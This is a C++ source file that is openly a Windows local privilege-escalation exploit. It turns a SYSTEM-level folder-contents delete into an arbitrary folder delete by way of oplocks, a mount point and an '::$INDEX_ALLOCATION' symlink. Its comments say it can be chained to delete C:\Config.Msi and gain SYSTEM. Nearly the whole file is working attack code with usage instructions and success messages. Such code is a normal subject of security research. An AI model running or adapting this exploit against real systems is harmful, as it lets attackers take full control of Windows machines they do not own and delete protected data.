// Exploit code to turn a delete of arbitrary folder contents as SYSTEM into an arbitrary folder delete as SYSTEM.
// Based on a technique by Abdelhamid Naceri (halov).
// By using this to delete C:\Config.Msi, this can be chained with FolderOrFileDeleteToSystem to get SYSTEM EoP.

#include <Windows.h>
#include <iostream>
#include <iomanip>
#include "Win-Ops-Master.h"

OpsMaster op;

HANDLE hdir = NULL;
HANDLE hf = NULL;
std::wstring folder1path;
const wchar_t folder2path[] = L"C:\\test2";
const wchar_t exploitFileName[] = L"trick.txt";
const wchar_t* targetDir;

void callback1()
{
    op.MoveFileToTempDir(hf);
    op.CreateMountPoint(
        std::wstring(L"\\??\\") + folder1path,
        L"\\RPC CONTROL\\");
    std::wstring symlinkTarget = targetDir;
    symlinkTarget = symlinkTarget.substr(0, symlinkTarget.find_last_not_of(L'\\') + 1);
    symlinkTarget = std::wstring(L"\\??\\") + symlinkTarget + L"::$INDEX_ALLOCATION";
    std::wstring linkName = std::wstring(L"\\RPC CONTROL\\") + exploitFileName;
    op.CreateNativeSymlink(linkName.c_str(), symlinkTarget.c_str());
}

int wmain(int argc, const wchar_t* argv[])
{
    auto usage = [&]() {
        std::wcerr << L"Usage:" << std::endl;
        std::wcerr << L" " << argv[0] << std::endl;
        std::wcerr << L"\t/target <target_dir_absolute>" << std::endl;
        std::wcerr << L"\t[/initial <initial_delete_root_absolute>]" << std::endl;
        std::wcerr << std::endl;
        std::wcerr << L"The target dir is the folder that you want to delete." << std::endl;
        std::wcerr << std::endl;
        std::wcerr << L"The initial delete root is the folder where you have a folder contents delete primitive." << std::endl;
        std::wcerr << L"For example, you might have a primitive that recursively deletes all files found within" << std::endl;
        std::wcerr << L"C:\\Windows\\Temp\\abc. You can specify that as the initial delete root. This exploit" << std::endl;
        std::wcerr << L"will first create the necessary file/folder structure within the initial delete root," << std::endl;
        std::wcerr << L"and then prompt you to trigger the delete. Note that the initial delete root must be" << std::endl;
        std::wcerr << L"a writable location. You may leave this blank if you have a contents delete of an arbitrary folder." << std::endl;
        exit(1);
    };

    auto getArg = [&](int argi) {
        if (!(argi < argc))
        {
            usage();
            exit(1);
        }
        else
        {
            return argv[argi];
        }
    };


    targetDir = NULL;
    const wchar_t* initialDeleteRoot = NULL;

    for (int argi = 1; argi < argc; argi++)
    {
        if (!_wcsicmp(argv[argi], L"/target"))
        {
            argi++;
            targetDir = getArg(argi);
        }
        else if (!_wcsicmp(argv[argi], L"/initial"))
        {
            argi++;
            initialDeleteRoot = getArg(argi);
        }
        else
        {
            usage();
            exit(1);
        }
    }

    if (targetDir == NULL)
    {
        usage();
        exit(1);
    }

    if (initialDeleteRoot == NULL)
    {
        initialDeleteRoot = L"C:\\";
    }

    folder1path = initialDeleteRoot;
    if (folder1path[folder1path.length() - 1] != L'\\')
    {
        folder1path += L"\\";
    }
    folder1path += L"test1";

    BOOL bCreateTargetDirSuccess = CreateDirectory(targetDir, NULL);       // In case target dir doesn't exist, we'll create it
    if (bCreateTargetDirSuccess)
    {
        std::wcout << L"[+] Created target dir: " << targetDir << std::endl;
    }

    CreateDirectory(folder2path, NULL);

    RemoveDirectory(folder1path.c_str());

    hdir = op.OpenDirectory(folder1path.c_str(), GENERIC_READ | GENERIC_WRITE | DELETE, ALL_SHARING);

    std::wstring exploitFilePath = std::wstring(folder1path.c_str()) + L"\\" + exploitFileName;
    DeleteFileW(exploitFilePath.c_str());
    hf = op.OpenFileNative(exploitFilePath.c_str(), MAXIMUM_ALLOWED, FILE_SHARE_READ | FILE_SHARE_WRITE, CREATE_ALWAYS);

    lock_ptr lk = op.CreateLock(hf, callback1);

    std::wcout << L"[+] Ready. Now run the privileged process to delete contents of " << folder1path << L"." << std::endl;
    std::wcout << L"[+] Or, for testing purposes, execute at an elevated command prompt: del /q " << folder1path << L"\\*" << std::endl;

    lk->WaitForLock(INFINITE);

    for (unsigned int i = 0; i < 50; i++)
    {
        Sleep(100);
        if (GetFileAttributesW(targetDir) == INVALID_FILE_ATTRIBUTES)
        {
            DWORD dwError = GetLastError();
            if (dwError == ERROR_FILE_NOT_FOUND)
            {
                std::wcout << L"[+] SUCCESS: Target folder deleted." << std::endl;
                std::wcout << L"[+] Done." << std::endl;
                exit(0);
            }
        }
    }

    std::wcout << L"[-] FAIL: Target folder has not been deleted within the expected amount of time." << std::endl;
}
